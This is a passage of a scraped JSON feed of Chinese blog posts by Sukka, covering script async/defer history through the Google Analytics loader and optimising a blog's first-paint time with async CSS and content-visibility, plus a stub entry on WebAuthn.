class=\"hljs-string\">'ga'</span>].<span class=\"hljs-property\">q</span> || []).<span class=\"hljs-title function_\">push</span>(<span class=\"hljs-variable language_\">arguments</span>)};<span class=\"hljs-variable language_\">window</span>[<span class=\"hljs-string\">'ga'</span>].<span class=\"hljs-property\">l</span> = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-variable language_\">document</span>.<span class=\"hljs-title function_\">createElement</span>(<span class=\"hljs-string\">'script'</span>);a.<span class=\"hljs-property\">async</span> = <span class=\"hljs-number\">1</span>;a.<span class=\"hljs-property\">src</span> = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-variable language_\">document</span>.<span class=\"hljs-title function_\">getElementsByTagName</span>(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.<span class=\"hljs-property\">parentNode</span>.<span class=\"hljs-title function_\">insertBefore</span>(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><span class=\"language-javascript\"><span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">ga</span>=<span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">ga</span>||<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>){(ga.<span class=\"hljs-property\">q</span>=ga.<span class=\"hljs-property\">q</span>||[]).<span class=\"hljs-title function_\">push</span>(<span class=\"hljs-variable language_\">arguments</span>)};ga.<span class=\"hljs-property\">l</span>=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Date</span>;</span><span class=\"language-javascript\"><span class=\"hljs-title function_\">ga</span>(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"language-javascript\"><span class=\"hljs-title function_\">ga</span>(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"language-javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no \"document.write\" in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<p><img src=\"https://pic.skk.moe/file/moegirl/ckz6vn6qm00003f5yh5f0tvq8.svg\"></p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\">\n<div>从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div>\n<div><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-10-13</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"language-javascript\"></span><span class=\"language-javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"language-javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"language-javascript\">  <span class=\"hljs-title function_\">getFCP</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(name, value));</span><span class=\"language-javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"language-javascript\">  <span class=\"hljs-title function_\">getLCP</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(name, value));</span><span class=\"language-javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"language-javascript\">  <span class=\"hljs-title function_\">getFID</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(name, value));</span><span class=\"language-javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/1.png\" width=\"1276\" height=\"279\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/2.png\" width=\"1386\" height=\"946\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/3.png\" width=\"860\" height=\"450\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/4.png\" width=\"1194\" height=\"946\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/5.png\" width=\"960\" height=\"500\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/6.png\" width=\"1090\" height=\"314\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/9.png\" width=\"813\" height=\"849\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/7.png\" width=\"800\" height=\"368\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中...」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/8.png\" width=\"1106\" height=\"945\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content-visibility</span>: auto;  <span class=\"hljs-attribute\">contain</span>-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\">\n<div>再快一点，再快一点 —— 优化博客白屏时间的实践</div>\n<div><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-10-03</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将 […]","link":"https://flyhigher.top/develop/2160.html"}]